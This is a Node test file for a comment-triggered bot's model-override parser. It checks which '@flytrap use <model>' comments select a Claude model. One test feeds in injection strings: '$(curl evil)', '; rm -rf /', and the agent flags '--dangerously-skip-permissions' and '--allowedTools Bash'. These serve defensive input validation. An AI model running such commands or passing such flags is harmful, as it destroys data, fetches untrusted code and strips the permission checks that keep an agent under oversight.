import { test } from 'node:test';
import assert from 'node:assert/strict';
import { MODELS, parseModelOverride } from '../src/model.js';

const model = (body) => parseModelOverride(body)?.model;

test('a comment without "use <name>" after the mention asks for no model', () => {
  assert.equal(parseModelOverride('@flytrap'), null);
  assert.equal(parseModelOverride('@flytrap please take a look'), null);
  assert.equal(parseModelOverride('use sonnet please'), null, 'no mention');
  assert.equal(parseModelOverride('@flytrap please use sonnet'), null, '"use" must follow the mention');
  assert.equal(parseModelOverride(undefined), null);
});

test('a sentence that happens to start "use ..." is not a request for a model', () => {
  for (const body of [
    '@flytrap use the new rubric',
    '@flytrap use caution on auth',
    '@flytrap use opus 4 times',
    '@flytrap use sonnet5.5 and be thorough',
    '@flytrap use ???',
    '@flytrap use ｓｏｎｎｅｔ',
  ]) {
    assert.equal(parseModelOverride(body), null, body);
  }
});

test('a quoted reply or a code block showing the syntax is not a request', () => {
  assert.equal(model('> @flytrap use gpt4\n\n@flytrap use sonnet'), 'claude-sonnet-5-5');
  assert.equal(model('```\n@flytrap use haiku\n```\n@flytrap use opus'), 'claude-opus-5-5');
  assert.equal(model('~~~\n@flytrap use haiku\n~~~\n@flytrap use opus'), 'claude-opus-5-5');
  assert.equal(parseModelOverride('> @flytrap use opus'), null);
  assert.equal(parseModelOverride('```\n@flytrap use opus'), null, 'an unclosed fence runs to the end');
});

test('accepts a family name, a version, and the full model ID', () => {
  assert.equal(model('@flytrap use sonnet'), 'claude-sonnet-5-5');
  assert.equal(model('@flytrap use sonnet5.5'), 'claude-sonnet-5-5');
  assert.equal(model('@flytrap use opus'), 'claude-opus-5-5');
  assert.equal(model('@flytrap use fable5.1'), 'claude-fable-5-1');
  assert.equal(model('@flytrap use haiku'), 'claude-haiku-4-5-20251001');
  assert.equal(model('@flytrap use claude-haiku-4-5-20251001'), 'claude-haiku-4-5-20251001');
});

test('spelling, case, spacing and punctuation do not matter', () => {
  for (const body of [
    '@flytrap use Sonnet 5.5',
    '@Flytrap USE sonnet-5-5',
    '@flytrap, use sonnet5.5.',
    '@flytrap: use sonnet 5.5!',
    'Thanks!\n@flytrap use sonnet5.5\nand be thorough',
    'can you look? @flytrap use sonnet5.5',
  ]) {
    assert.equal(model(body), 'claude-sonnet-5-5', body);
  }
});

test('a name that is not listed comes back with no model, keeping what was asked for', () => {
  assert.deepEqual(parseModelOverride('@flytrap use gpt4.'), { name: 'gpt4', model: null });
  assert.equal(model('@flytrap use sonnet9'), null);
  assert.deepEqual(parseModelOverride('@flytrap use gpt-4.5-turbo!'), { name: 'gpt-4.5-turbo', model: null });
});

test('text that is not a model name never becomes one', () => {
  for (const body of [
    '@flytrap use opus --dangerously-skip-permissions',
    '@flytrap use opus\n--allowedTools Bash',
    '@flytrap use $(curl evil)',
    '@flytrap use opus`; rm -rf /',
  ]) {
    const result = parseModelOverride(body);
    assert.ok(result === null || result.model === null || Object.keys(MODELS).includes(result.model), body);
  }
  // On its own line the name is the whole request, so what is echoed back is one plain word.
  assert.equal(parseModelOverride('@flytrap use opus\n--allowedTools Bash').model, 'claude-opus-5-5');
});

test('the first mention with a model wins', () => {
  assert.equal(model('@flytrap use haiku\n@flytrap use opus'), 'claude-haiku-4-5-20251001');
});
